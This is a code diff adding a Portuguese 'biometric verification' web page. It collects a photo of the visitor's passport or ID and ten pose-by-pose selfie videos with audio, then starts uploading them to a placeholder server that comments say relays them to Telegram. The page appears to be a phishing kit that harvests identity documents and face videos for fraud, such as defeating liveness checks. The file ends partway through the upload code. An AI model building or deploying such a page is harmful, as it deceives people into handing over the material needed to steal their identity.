@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verificação Biométrica</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+:root{--bg:#080c14;--surf:#0f1623;--card:#151e2e;--bdr:#1e2d45;--acc:#2563eb;--acc2:#0ea5e9;--ok:#10b981;--err:#ef4444;--warn:#f59e0b;--txt:#f1f5f9;--muted:#64748b}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;display:flex;flex-direction:column;align-items:center;overflow-x:hidden}
+.header{width:100%;background:var(--surf);border-bottom:1px solid var(--bdr);padding:12px 18px;display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:200}
+.logo{width:34px;height:34px;background:linear-gradient(135deg,var(--acc),var(--acc2));border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;color:#fff}
+.htxt h1{font-size:14px;font-weight:600}.htxt p{font-size:10px;color:var(--muted)}
+.steps{width:100%;background:var(--surf);border-bottom:1px solid var(--bdr);padding:10px 16px;display:flex;align-items:center;gap:4px;overflow-x:auto;scrollbar-width:none}
+.steps::-webkit-scrollbar{display:none}
+.sn{width:26px;height:26px;border-radius:50%;border:2px solid var(--bdr);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:600;color:var(--muted);flex-shrink:0;transition:all .3s}
+.sn.done{background:var(--ok);border-color:var(--ok);color:#fff}.sn.active{background:var(--acc);border-color:var(--acc);color:#fff}
+.sl{flex:1;height:2px;background:var(--bdr);min-width:6px;flex-shrink:0;transition:background .3s}.sl.done{background:var(--ok)}
+.screen{display:none;width:100%;max-width:480px;padding-bottom:60px;flex-direction:column;align-items:center}
+.screen.active{display:flex}
+.ttl{font-size:20px;font-weight:700;text-align:center;padding:22px 20px 6px;line-height:1.3}
+.sub{font-size:13px;color:var(--muted);text-align:center;padding:0 24px 18px;line-height:1.6}
+.card{width:calc(100% - 36px);margin:0 18px;background:var(--card);border:1px solid var(--bdr);border-radius:16px;padding:14px 16px;font-size:12px;color:var(--muted);line-height:1.8}
+.card b{color:var(--txt)}
+.btn{width:calc(100% - 36px);margin:12px 18px 0;border:none;border-radius:16px;padding:15px;font-size:14px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-p{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
+.btn-p:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 8px 24px rgba(37,99,235,.35)}
+.btn-p:disabled{opacity:.4;cursor:not-allowed}
+.btn-s{background:var(--card);color:var(--txt);border:1px solid var(--bdr)}
+.badge{width:calc(100% - 36px);margin:10px 18px 0;background:var(--card);border:1px solid var(--bdr);border-radius:12px;padding:11px 14px;display:flex;align-items:center;gap:10px;font-size:11px;color:var(--muted)}
+.bid{color:var(--acc2);font-size:11px;font-weight:600;margin-top:2px;word-break:break-all}
+.doc-area{width:calc(100% - 36px);aspect-ratio:3/2;background:var(--card);border:2px dashed var(--bdr);border-radius:16px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;cursor:pointer;transition:all .3s;position:relative;overflow:hidden}
+.doc-area:hover{border-color:var(--acc)}.doc-area img{width:100%;height:100%;object-fit:cover;border-radius:14px}
+#passportInput{display:none}
+.info-box{width:calc(100% - 36px);margin:10px 18px 0;background:rgba(37,99,235,.08);border:1px solid rgba(37,99,235,.2);border-radius:12px;padding:12px 14px;font-size:12px;color:var(--muted);line-height:1.7}
+.info-box strong{color:var(--acc2)}
+
+/* ═══ CAMERA ═══ */
+.cam-wrap{
+  width:100%;
+  position:relative;
+  aspect-ratio:9/16;  /* full portrait — shows face + chest + more body */
+  background:#000;
+  overflow:hidden;
+}
+#vid{
+  width:100%;height:100%;
+  object-fit:cover;display:block;
+  transform:scaleX(-1);
+  /* Pull back zoom — show more of the scene */
+  object-position:center center;
+}
+
+/* Corner decorations */
+.corner-frame{position:absolute;inset:0;pointer-events:none;z-index:5}
+.corner-frame::before,.corner-frame::after,.cf-b::before,.cf-b::after{content:'';position:absolute;width:28px;height:28px;border-color:rgba(255,255,255,.7);border-style:solid}
+.corner-frame::before{top:16px;left:16px;border-width:3px 0 0 3px;border-radius:4px 0 0 0}
+.corner-frame::after{top:16px;right:16px;border-width:3px 3px 0 0;border-radius:0 4px 0 0}
+.cf-b::before{bottom:16px;left:16px;border-width:0 0 3px 3px;border-radius:0 0 0 4px}
+.cf-b::after{bottom:16px;right:16px;border-width:0 3px 3px 0;border-radius:0 0 4px 0}
+
+/* Timer bar */
+.timer-bar{position:absolute;top:0;left:0;height:6px;width:0%;z-index:10;transition:width .1s linear;border-radius:0 3px 3px 0}
+.timer-bar.prep{background:linear-gradient(90deg,var(--warn),#fbbf24)}
+.timer-bar.rec{background:linear-gradient(90deg,var(--err),#f87171)}
+
+/* REC dot */
+.rec-dot{position:absolute;top:14px;right:14px;display:none;align-items:center;gap:6px;background:rgba(0,0,0,.85);border-radius:20px;padding:6px 12px;font-size:12px;font-weight:700;color:#fff;z-index:20}
+.rec-dot.show{display:flex}
+.rec-circle{width:10px;height:10px;background:var(--err);border-radius:50%;animation:recblink .8s infinite}
+@keyframes recblink{0%,100%{opacity:1}50%{opacity:.2}}
+
+/* BIG pose overlay — shown before recording */
+.pose-overlay{
+  position:absolute;inset:0;
+  background:rgba(8,12,20,.88);
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  gap:12px;z-index:25;
+  opacity:0;pointer-events:none;
+  transition:opacity .25s;
+}
+.pose-overlay.show{opacity:1;pointer-events:auto}
+.po-arrow{font-size:80px;line-height:1;animation:bounce 0.7s infinite alternate}
+@keyframes bounce{0%{transform:scale(1)}100%{transform:scale(1.15)}}
+.po-label{font-size:22px;font-weight:700;color:#fff;text-align:center}
+.po-tip{font-size:13px;color:var(--warn);text-align:center;padding:0 24px;font-weight:500}
+.po-countdown{
+  width:64px;height:64px;
+  border-radius:50%;
+  background:var(--acc);
+  display:flex;align-items:center;justify-content:center;
+  font-size:28px;font-weight:700;color:#fff;
+  box-shadow:0 0 0 6px rgba(37,99,235,.3);
+  margin-top:4px;
+}
+.po-bar{width:70%;height:5px;background:rgba(255,255,255,.15);border-radius:5px;overflow:hidden}
+.po-bar-fill{height:100%;width:0%;background:var(--warn);border-radius:5px}
+
+/* Live instruction (during recording) */
+.live-inst{
+  position:absolute;bottom:0;left:0;right:0;
+  background:rgba(0,0,0,.82);
+  backdrop-filter:blur(10px);
+  padding:14px 16px;
+  display:flex;flex-direction:column;
+  align-items:center;gap:6px;
+  z-index:20;
+  border-top:1px solid rgba(255,255,255,.08);
+}
+.li-arrow{font-size:40px;line-height:1}
+.li-text{font-size:14px;font-weight:700;color:#fff;text-align:center}
+.li-sub{font-size:11px;color:var(--muted);text-align:center}
+.li-timer{
+  width:90%;height:5px;
+  background:rgba(255,255,255,.1);
+  border-radius:5px;overflow:hidden;margin-top:2px;
+}
+.li-timer-fill{height:100%;width:100%;background:var(--ok);border-radius:5px;transition:width .1s linear}
+
+/* Countdown number on video */
+.cntnum{position:absolute;top:42%;left:50%;transform:translate(-50%,-50%);font-size:100px;font-weight:700;color:#fff;opacity:0;pointer-events:none;text-shadow:0 4px 30px rgba(0,0,0,.8);transition:opacity .15s;z-index:22}
+.cntnum.show{opacity:1}
+
+/* Pose complete flash */
+.done-flash{position:absolute;inset:0;background:rgba(16,185,129,.25);z-index:30;opacity:0;pointer-events:none;border:4px solid var(--ok);transition:opacity .2s}
+.done-flash.show{opacity:1}
+
+/* Loading */
+.ld{position:absolute;inset:0;background:rgba(8,12,20,.95);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;z-index:50;transition:opacity .3s}
+.ld.gone{opacity:0;pointer-events:none}
+.spin{width:36px;height:36px;border:3px solid var(--bdr);border-top-color:var(--acc);border-radius:50%;animation:spin .8s linear infinite}
+.spin.sm{width:22px;height:22px;border-width:2px}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* Pose grid */
+.pose-grid{width:calc(100% - 36px);display:grid;grid-template-columns:repeat(5,1fr);gap:6px;margin:12px 18px 0}
+.pg{aspect-ratio:1;background:var(--card);border:2px solid var(--bdr);border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;font-size:10px;color:var(--muted);transition:all .3s;text-align:center;padding:4px}
+.pg .em{font-size:20px}
+.pg.done{border-color:var(--ok);background:rgba(16,185,129,.12);color:var(--ok)}
+.pg.active{border-color:var(--acc);background:rgba(37,99,235,.15);color:var(--acc);animation:pgpulse .9s infinite}
+@keyframes pgpulse{0%,100%{box-shadow:0 0 0 0 rgba(37,99,235,.4)}50%{box-shadow:0 0 0 4px rgba(37,99,235,.1)}}
+.prog-bar{width:calc(100% - 36px);height:5px;background:var(--bdr);border-radius:4px;margin:10px 18px 0;overflow:hidden}
+.prog-fill{height:100%;background:linear-gradient(90deg,var(--acc),var(--ok));border-radius:4px;transition:width .5s}
+
+/* Guide grid */
+.guide-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;width:calc(100% - 36px);margin:0 18px}
+.gg{aspect-ratio:1;background:var(--card);border:2px solid var(--bdr);border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;font-size:11px;color:var(--muted)}
+.gg .em{font-size:24px}
+
+/* Sending overlay */
+.sending-overlay{position:fixed;inset:0;background:rgba(8,12,20,.96);display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px;z-index:999}
+.sending-overlay.show{display:flex}
+.send-progress{width:260px;background:var(--bdr);border-radius:8px;height:6px;overflow:hidden}
+.send-prog-fill{height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2));border-radius:8px;transition:width .4s}
+
+/* Success */
+.ok-icon{width:78px;height:78px;background:linear-gradient(135deg,var(--ok),#059669);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:34px;animation:pop .5s cubic-bezier(.175,.885,.32,1.275) both}
+@keyframes pop{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
+.sum-row{width:100%;display:flex;align-items:center;gap:10px;padding:12px 14px;background:var(--card);border:1px solid var(--bdr);border-radius:12px;font-size:13px}
+.send-box{width:100%;display:flex;align-items:center;gap:10px;padding:12px 14px;background:var(--card);border-radius:12px;font-size:13px}
+.success-wrap{display:flex;flex-direction:column;align-items:center;padding:36px 18px;gap:14px;text-align:center}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">ID</div>
+  <div class="htxt">
+    <h1>Verificação Biométrica</h1>
+    <p id="sessLabel">Sessão: –</p>
+  </div>
+</div>
+<div class="steps" id="stepsBar"></div>
+
+<!-- INTRO -->
+<div class="screen active" id="sc-intro">
+  <div class="ttl">Verificação de Identidade</div>
+  <div class="sub">Complete os passos para verificar a sua identidade. Demora cerca de 3 minutos.</div>
+  <div class="card"><b>O que vai precisar:</b><br>📄 Passaporte ou BI válido<br>📷 Câmera frontal<br>🎤 Microfone ativo<br>💡 Boa iluminação<br>🧑 Rosto descoberto</div>
+  <div class="badge">
+    <span style="font-size:20px">🔐</span>
+    <div><div style="color:var(--txt);font-size:12px;font-weight:500">Sessão única</div><div class="bid" id="sessId"></div></div>
+  </div>
+  <div class="info-box">✅ Dados enviados de forma segura.<br><strong>Não partilhe este link.</strong></div>
+  <button class="btn btn-p" onclick="goTo(1)">▶ Começar Verificação</button>
+</div>
+
+<!-- PASSPORT -->
+<div class="screen" id="sc-passport">
+  <div class="ttl">📄 Documento de Identidade</div>
+  <div class="sub">Fotografe ou faça upload do Passaporte / BI.</div>
+  <div class="doc-area" id="docArea" onclick="document.getElementById('passportInput').click()">
+    <div id="docIcon" style="font-size:38px">🪪</div>
+    <div id="docLbl" style="font-size:13px;color:var(--muted)">Toque para fotografar ou carregar</div>
+    <img id="docPrev" style="display:none"/>
+  </div>
+  <input type="file" id="passportInput" accept="image/*" capture="environment" onchange="handleDoc(this)">
+  <div class="card" style="margin-top:12px"><b>Dicas:</b><br>✔ Plano, sem reflexos<br>✔ Texto visível<br>✗ Não tape nada</div>
+  <button class="btn btn-s" onclick="document.getElementById('passportInput').click()">📷 Câmera / Galeria</button>
+  <button class="btn btn-p" id="btnDocNext" disabled onclick="goTo(2)">Continuar →</button>
+</div>
+
+<!-- GUIDE -->
+<div class="screen" id="sc-guide">
+  <div class="ttl">🎯 Guia de Poses</div>
+  <div class="sub">Vai gravar <b>10 vídeos selfie</b> de 6 segundos cada.</div>
+  <div class="guide-grid">
+    <div class="gg"><span class="em">↖️</span><span>Cima-Esq</span></div>
+    <div class="gg"><span class="em">⬆️</span><span>Cima</span></div>
+    <div class="gg"><span class="em">↗️</span><span>Cima-Dir</span></div>
+    <div class="gg"><span class="em">⬅️</span><span>Esquerda</span></div>
+    <div class="gg" style="font-size:26px">🎯</div>
+    <div class="gg"><span class="em">➡️</span><span>Direita</span></div>
+    <div class="gg"><span class="em">↙️</span><span>Baixo-Esq</span></div>
+    <div class="gg"><span class="em">⬇️</span><span>Baixo</span></div>
+    <div class="gg"><span class="em">↘️</span><span>Baixo-Dir</span></div>
+  </div>
+  <div class="card" style="margin-top:12px">
+    <b>+ Frente parado e Sorriso</b><br><br>
+    ⏱️ Cada pose: <b>3s para preparar</b> → <b>8s a gravar</b><br><br>
+    🔴 Quando aparecer <b>A GRAVAR</b>, vire a cabeça para a direção indicada e <b>mantenha</b> até terminar.<br><br>
+    🎤 O microfone ficará ativo durante a gravação.
+  </div>
+  <button class="btn btn-p" onclick="startCapture()">📹 Iniciar Gravação</button>
+</div>
+
+<!-- POSES -->
+<div class="screen" id="sc-poses">
+  <div class="cam-wrap" id="camWrap">
+    <video id="vid" autoplay muted playsinline></video>
+
+    <!-- Corner frames -->
+    <div class="corner-frame"><div class="cf-b"></div></div>
+
+    <div class="timer-bar" id="timerBar"></div>
+
+    <!-- Loading -->
+    <div class="ld" id="ldOverlay">
+      <div class="spin"></div>
+      <div style="font-size:14px;font-weight:600">A iniciar câmera…</div>
+      <div style="font-size:11px;color:var(--muted)" id="ldSub">A pedir permissões</div>
+    </div>
+
+    <!-- BIG pose instruction overlay (shown during prep countdown) -->
+    <div class="pose-overlay" id="poseOverlay">
+      <div class="po-arrow" id="poArrow">⬆️</div>
+      <div class="po-label" id="poLabel">Pose: Cima</div>
+      <div class="po-tip" id="poTip">Prepare-se para virar o queixo para cima</div>
+      <div class="po-countdown" id="poCountdown">3</div>
+      <div class="po-bar"><div class="po-bar-fill" id="poBarFill"></div></div>
+    </div>
+
+    <!-- REC indicator -->
+    <div class="rec-dot" id="recDot">
+      <div class="rec-circle"></div> REC 🎤
+    </div>
+
+    <!-- Countdown number during recording -->
+    <div class="cntnum" id="cntNum"></div>
+
+    <!-- Done flash -->
+    <div class="done-flash" id="doneFlash"></div>
+
+    <!-- Live instruction bar (bottom, during recording) -->
+    <div class="live-inst" id="liveInst" style="display:none">
+      <div class="li-arrow" id="liArrow">⬆️</div>
+      <div class="li-text" id="liText">Vire o queixo para CIMA</div>
+      <div class="li-sub" id="liSub">Mantenha a pose até terminar</div>
+      <div class="li-timer"><div class="li-timer-fill" id="liTimerFill"></div></div>
+    </div>
+  </div>
+
+  <div class="pose-grid" id="poseGrid"></div>
+  <div class="prog-bar"><div class="prog-fill" id="progFill" style="width:0%"></div></div>
+  <div class="info-box" style="margin-top:10px">
+    🟡 <strong>Preparar</strong> — veja a instrução → 🔴 <strong>Gravar</strong> — mantenha a pose
+  </div>
+</div>
+
+<!-- SUCCESS -->
+<div class="screen" id="sc-success">
+  <div class="success-wrap">
+    <div class="ok-icon">✅</div>
+    <div class="ttl" style="padding:0">Verificação Concluída!</div>
+    <div class="sub" style="padding:0">Todos os vídeos capturados e enviados.</div>
+    <div class="badge" style="margin:0;width:100%">
+      <span style="font-size:18px">📋</span>
+      <div><div style="color:var(--txt);font-size:12px;font-weight:500">Referência</div><div class="bid" id="successSess"></div></div>
+    </div>
+    <div id="sumRows" style="width:100%;display:flex;flex-direction:column;gap:8px"></div>
+    <div class="send-box" id="sendBox">
+      <div class="spin sm" id="sendSpin"></div>
+      <span id="sendTxt">A enviar vídeos para o servidor…</span>
+    </div>
+  </div>
+</div>
+
+<!-- SENDING OVERLAY -->
+<div class="sending-overlay" id="sendingOverlay">
+  <div class="spin" style="width:48px;height:48px;border-width:4px"></div>
+  <div style="font-size:15px;font-weight:600" id="sendOvTitle">A enviar vídeos…</div>
+  <div style="font-size:12px;color:var(--muted)" id="sendOvSub">Aguarde, não feche a página</div>
+  <div class="send-progress"><div class="send-prog-fill" id="sendProgFill" style="width:0%"></div></div>
+  <div style="font-size:11px;color:var(--muted)" id="sendOvCount"></div>
+</div>
+
+<script>
+// ════ POSES ══════════════════════════════════════════
+const POSES=[
+  {id:'front', label:'Frente',    em:'🎯', arrow:'🎯', tip:'Olhe direto para a câmera'},
+  {id:'up',    label:'Cima',      em:'⬆️', arrow:'⬆️', tip:'Levante o queixo para CIMA'},
+  {id:'down',  label:'Baixo',     em:'⬇️', arrow:'⬇️', tip:'Baixe o queixo para BAIXO'},
+  {id:'left',  label:'Esquerda',  em:'⬅️', arrow:'⬅️', tip:'Vire a cabeça para a ESQUERDA'},
+  {id:'right', label:'Direita',   em:'➡️', arrow:'➡️', tip:'Vire a cabeça para a DIREITA'},
+  {id:'ul',    label:'Cima-Esq',  em:'↖️', arrow:'↖️', tip:'Vire para a ESQUERDA e levante o queixo'},
+  {id:'ur',    label:'Cima-Dir',  em:'↗️', arrow:'↗️', tip:'Vire para a DIREITA e levante o queixo'},
+  {id:'dl',    label:'Baixo-Esq', em:'↙️', arrow:'↙️', tip:'Vire para a ESQUERDA e baixe o queixo'},
+  {id:'dr',    label:'Baixo-Dir', em:'↘️', arrow:'↘️', tip:'Vire para a DIREITA e baixe o queixo'},
+  {id:'smile', label:'Sorriso',   em:'😄', arrow:'😄', tip:'Olhe para a câmera e SORRIA'},
+];
+
+const PREP_MS = 3000;  // 3s prep countdown
+const REC_MS  = 8000;  // 8s recording
+
+let step=0, docFile=null, poseVideos={}, poseIdx=0;
+let camStream=null;
+let mediaRecorder=null, recordedChunks=[];
+let isRecording=false;
+let poseRunning=false;
+
+const SESS=genSess();
+document.getElementById('sessId').textContent=SESS;
+document.getElementById('sessLabel').textContent='Sessão: '+SESS.slice(0,10)+'…';
+function genSess(){const c='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';let s='';for(let i=0;i<20;i++){if(i&&i%5===0)s+='-';s+=c[Math.floor(Math.random()*c.length)]}return s}
+
+// ════ NAV ════════════════════════════════════════════
+const SL=['Início','Documento','Guia','Poses','Concluído'];
+function buildSteps(){
+  const b=document.getElementById('stepsBar');b.innerHTML='';
+  for(let i=0;i<SL.length;i++){
+    const n=document.createElement('div');
+    n.className='sn'+(i<step?' done':i===step?' active':'');
+    n.textContent=i<step?'✓':(i+1);
+    b.appendChild(n);
+    if(i<SL.length-1){const l=document.createElement('div');l.className='sl'+(i<step?' done':'');b.appendChild(l)}
+  }
+}
+function showScreen(id){document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));document.getElementById('sc-'+id).classList.add('active')}
+function goTo(n){step=n;buildSteps();showScreen(['intro','passport','guide','poses','success'][n])}
+
+// ════ DOCUMENT ═══════════════════════════════════════
+let docFile=null; // keep raw file reference, not base64
+
+function handleDoc(inp){
+  const f=inp.files[0];if(!f)return;
+  docFile=f;
+  // Use object URL — zero memory overhead vs base64
+  const url=URL.createObjectURL(f);
+  document.getElementById('docPrev').src=url;
+  document.getElementById('docPrev').style.display='block';
+  document.getElementById('docIcon').style.display='none';
+  document.getElementById('docLbl').style.display='none';
+  document.getElementById('btnDocNext').disabled=false;
+}
+
+// ════ POSE GRID ══════════════════════════════════════
+function buildPoseGrid(){
+  const g=document.getElementById('poseGrid');g.innerHTML='';
+  POSES.forEach((p,i)=>{
+    const d=document.createElement('div');
+    d.className='pg'+(i===0?' active':'');
+    d.id='pg-'+i;
+    d.innerHTML=`<span class="em">${p.em}</span><span>${p.label}</span>`;
+    g.appendChild(d);
+  });
+}
+function updateGrid(){
+  POSES.forEach((_,i)=>{
+    const e=document.getElementById('pg-'+i);
+    if(e) e.className='pg'+(i<poseIdx?' done':i===poseIdx?' active':'');
+  });
+  document.getElementById('progFill').style.width=(poseIdx/POSES.length*100)+'%';
+}
+
+// ════ CAMERA START ═══════════════════════════════════
+function startCapture(){goTo(3);buildPoseGrid();initCamera()}
+
+// Canvas used to record — draws video WITHOUT mirror (correct orientation)
+let recordCanvas=null, recordCtx=null, recordStream=null, drawLoop=null;
+
+async function initCamera(){
+  const sub=document.getElementById('ldSub');
+  try{
+    sub.textContent='A pedir permissão de câmera e microfone…';
+    camStream=await navigator.mediaDevices.getUserMedia({
+      video:{
+        facingMode:'user',
+        width:{ideal:1280},
+        height:{ideal:720}
+      },
+      audio:true
+    });
+    const vid=document.getElementById('vid');
+    vid.srcObject=camStream;
+    await vid.play();
+
+    // Set up off-screen canvas for recording — NOT mirrored
+    // This is what gets saved/uploaded — correct orientation for facial recognition
+    recordCanvas=document.createElement('canvas');
+    recordCanvas.width=720;
+    recordCanvas.height=1280;
+    recordCtx=recordCanvas.getContext('2d');
+
+    // Start drawing loop (60fps) — draws video normally (no mirror)
+    function drawFrame(){
+      if(!recordCtx) return;
+      // Draw video stretched to portrait — no mirror, correct for biometrics
+      recordCtx.drawImage(vid, 0, 0, recordCanvas.width, recordCanvas.height);
+      drawLoop=requestAnimationFrame(drawFrame);
+    }
+    drawFrame();
+
+    // Combine canvas video + mic audio
+    const audioTracks=camStream.getAudioTracks();
+    const canvasVideoStream=recordCanvas.captureStream(30);
+    recordStream=new MediaStream([
+      ...canvasVideoStream.getVideoTracks(),
+      ...audioTracks
+    ]);
+
+    document.getElementById('ldOverlay').classList.add('gone');
+    setTimeout(()=>runPose(poseIdx), 600);
+  }catch(e){
+    sub.textContent='❌ Erro: '+e.message;
+    console.error(e);
+  }
+}
+
+// ════ POSE RUNNER — pure timer, no ML ════════════════
+function runPose(idx){
+  if(poseRunning) return;
+  poseRunning=true;
+  const pose=POSES[idx];
+
+  // ── PREP phase: show big overlay with countdown ──
+  showPrepOverlay(pose, ()=>{
+    // ── REC phase: hide overlay, show live bar, record ──
+    hidePrepOverlay();
+    showLiveInst(pose);
+    startRecording();
+    runRecTimer(REC_MS, ()=>{
+      // Done
+      hideLiveInst();
+      stopRecording(blob=>{
+        poseVideos[pose.id]={blob, label:pose.label, em:pose.em, id:pose.id};
+        showDoneFlash(()=>{
+          document.getElementById('pg-'+idx).className='pg done';
+          poseIdx++;
+          poseRunning=false;
+          if(poseIdx>=POSES.length){
+            finishAll();
+          } else {
+            updateGrid();
+            setTimeout(()=>runPose(poseIdx), 500);
+          }
+        });
+      });
+    });
+  });
+}
+
+// ── Prep overlay ─────────────────────────────────────
+function showPrepOverlay(pose, onDone){
+  const ov=document.getElementById('poseOverlay');
+  document.getElementById('poArrow').textContent=pose.arrow;
+  document.getElementById('poLabel').textContent='Pose '+( poseIdx+1)+'/'+POSES.length+': '+pose.label;
+  document.getElementById('poTip').textContent=pose.tip;
+  document.getElementById('poBarFill').style.width='0%';
+
+  // Timer bar (yellow = prep)
+  const tb=document.getElementById('timerBar');
+  tb.className='timer-bar prep';
+  tb.style.width='0%';
+
+  ov.classList.add('show');
+
+  let start=Date.now();
+  let lastSec=-1;
+
+  const tick=setInterval(()=>{
+    const el=Date.now()-start;
+    const pct=Math.min(100,(el/PREP_MS)*100);
+    document.getElementById('poBarFill').style.width=pct+'%';
+    tb.style.width=pct+'%';
+
+    const secLeft=Math.max(0, Math.ceil((PREP_MS-el)/1000));
+    if(secLeft!==lastSec){
+      lastSec=secLeft;
+      document.getElementById('poCountdown').textContent=secLeft||'▶';
+    }
+
+    if(el>=PREP_MS){
+      clearInterval(tick);
+      tb.style.width='0%';
+      onDone();
+    }
+  },30);
+}
+
+function hidePrepOverlay(){
+  document.getElementById('poseOverlay').classList.remove('show');
+}
+
+// ── Live instruction during recording ─────────────────
+function showLiveInst(pose){
+  document.getElementById('liArrow').textContent=pose.arrow;
+  document.getElementById('liText').textContent=pose.tip;
+  document.getElementById('liSub').textContent='Mantenha — gravando com áudio 🎤';
+  document.getElementById('liTimerFill').style.width='100%';
+  document.getElementById('liveInst').style.display='flex';
+  document.getElementById('recDot').classList.add('show');
+
+  // Timer bar = red during recording
+  const tb=document.getElementById('timerBar');
+  tb.className='timer-bar rec';
+  tb.style.width='0%';
+}
+
+function hideLiveInst(){
+  document.getElementById('liveInst').style.display='none';
+  document.getElementById('recDot').classList.remove('show');
+}
+
+// ── Recording timer ───────────────────────────────────
+function runRecTimer(duration, onDone){
+  const start=Date.now();
+  const tb=document.getElementById('timerBar');
+  const ltf=document.getElementById('liTimerFill');
+  const cntEl=document.getElementById('cntNum');
+
+  let lastSec=-1;
+  const tick=setInterval(()=>{
+    const el=Date.now()-start;
+    const pct=Math.min(100,(el/duration)*100);
+    tb.style.width=pct+'%';
+    ltf.style.width=(100-pct)+'%'; // shrinks left to right
+
+    const secLeft=Math.max(1, Math.ceil((duration-el)/1000));
+    if(secLeft!==lastSec){
+      lastSec=secLeft;
+      cntEl.textContent=secLeft;
+      cntEl.className='cntnum show';
+    }
+
+    if(el>=duration){
+      clearInterval(tick);
+      cntEl.className='cntnum';
+      tb.style.width='0%';
+      onDone();
+    }
+  },30);
+}
+
+// ── Done flash ────────────────────────────────────────
+function showDoneFlash(onDone){
+  const f=document.getElementById('doneFlash');
+  f.classList.add('show');
+  setTimeout(()=>{ f.classList.remove('show'); onDone(); }, 500);
+}
+
+// ════ MEDIA RECORDER ═════════════════════════════════
+function getBestMimeType(){
+  // MP4 H.264 first — required by most biometric/facial recognition systems
+  const types=[
+    'video/mp4;codecs=avc1',
+    'video/mp4;codecs=h264',
+    'video/mp4',
+    'video/webm;codecs=h264',
+    'video/webm;codecs=vp9',
+    'video/webm;codecs=vp8',
+    'video/webm'
+  ];
+  for(const t of types){ if(MediaRecorder.isTypeSupported(t)) return t; }
+  return '';
+}
+
+function startRecording(){
+  recordedChunks=[];
+  try{
+    const mime=getBestMimeType();
+    console.log('Recording with MIME:', mime);
+    const opts=mime ? {mimeType:mime, videoBitsPerSecond:4_000_000} : {videoBitsPerSecond:4_000_000};
+    // Record from unmirrored canvas stream (correct orientation for facial recognition)
+    const streamToRecord = recordStream || camStream;
+    mediaRecorder=new MediaRecorder(streamToRecord, opts);
+    mediaRecorder.ondataavailable=e=>{ if(e.data&&e.data.size>0) recordedChunks.push(e.data); };
+    mediaRecorder.start(200);
+    isRecording=true;
+  }catch(e){ console.error('MediaRecorder:',e); }
+}
+
+function stopRecording(cb){
+  if(!isRecording||!mediaRecorder){ cb(null); return; }
+  mediaRecorder.onstop=()=>{
+    const mime=mediaRecorder.mimeType||'video/webm';
+    cb(new Blob(recordedChunks,{type:mime}));
+    isRecording=false;
+    recordedChunks=[];
+  };
+  try{ mediaRecorder.stop(); }catch(e){ cb(null); }
+}
+
+// ════ FINISH ═════════════════════════════════════════
+function finishAll(){
+  if(drawLoop) cancelAnimationFrame(drawLoop);
+  if(camStream) camStream.getTracks().forEach(t=>t.stop());
+  step=4; buildSteps(); showScreen('success');
+  document.getElementById('successSess').textContent=SESS;
+  buildSummary();
+  processAll();
+}
+
+function buildSummary(){
+  const w=document.getElementById('sumRows');
+  const vCount=Object.keys(poseVideos).length;
+  [{icon:'📄',label:'Documento de identidade',ok:!!docFile},
+   {icon:'📹',label:`${vCount} vídeos selfie com áudio`,ok:vCount>=POSES.length}].forEach(r=>{
+    const d=document.createElement('div');d.className='sum-row';
+    d.innerHTML=`<span style="font-size:20px">${r.icon}</span><span style="flex:1">${r.label}</span><span style="color:${r.ok?'var(--ok)':'var(--err)'}">${r.ok?'✅':'❌'}</span>`;
+    w.appendChild(d);
+  });
+}
+
+// ════ DOWNLOAD helper ════════════════════════════════
+function downloadBlob(blob, filename){
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement('a');
+  a.href=url; a.download=filename;
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(()=>{ URL.revokeObjectURL(url); a.remove(); }, 1000);
+}
+
+// ════ PROCESS: envia tudo ao servidor Railway ════════
+// O servidor converte WebM→MP4 e envia ao Telegram
+const SERVER_URL = 'https://SEU-SERVIDOR.railway.app'; // ← substitui depois do deploy
+
+async function processAll(){
+  const overlay  = document.getElementById('sendingOverlay');
+  const ovTitle  = document.getElementById('sendOvTitle');
+  const ovSub    = document.getElementById('sendOvSub');
+  const ovCount  = document.getElementById('sendOvCount');
+  const progFill = document.getElementById('sendProgFill');
+  overlay.classList.add('show');
+  ovSub.textContent = 'Aguarde, não feche a página';
+
+  const entries = Object.entries(poseVideos);
+  const total   = entries.length + (docFile ? 1 : 0) + 1;
+  let done = 0;
+
+  function setProgress(label){
+    done++;
+    progFill.style.width = ((done/total)*100)+'%';
+    ovCount.textContent  = `${done}/${total} — ${label}`;
+  }
+
+  // ── 1. Resumo ──
+  try{
+    ovTitle.textContent = 'A enviar resumo…';
+    await serverMsg(`🆔 *Nova Verificação Biométrica*\n\n📋 Sessão: \`${SESS}\`\n📅 ${new Date().toLocaleString('pt-PT')}\n📄 Documento: ${docFile?'✅':'❌'}\n📹 Vídeos: ${entries.length}/${POSES.length} (MP4 H.264)\n\n_Ficheiros a seguir…_`);
+  } catch(e){ console.warn('resumo:', e); }
+  setProgress('Resumo enviado');
+
